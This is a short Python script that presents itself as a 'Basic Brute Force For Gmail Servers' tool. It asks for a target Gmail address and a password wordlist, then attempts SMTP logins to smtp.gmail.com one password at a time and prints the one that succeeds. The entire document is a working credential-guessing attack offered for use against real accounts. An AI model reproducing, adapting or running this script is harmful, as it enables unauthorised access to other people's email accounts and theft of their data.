import smtplib

print("""
|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|

Basic Brute Force For Gmail Servers
         ---How To Use?---
1- Enter the target  gmail address.
2- Get the word list path.

|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|
""")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()


user = raw_input("Enter the target address: ")
passwordFile = raw_input("Get the password file name: ")
passwordFile = open(passwordFile, "r")


for password in passwordFile:
    try:
        smtpserver.login(user, password)
        print("[+] Password Found!:  %s" % password)
        break;
    except smtplib.SMTPAuthenticationError:
        print("[-] Wrong Password =>  %s" % password)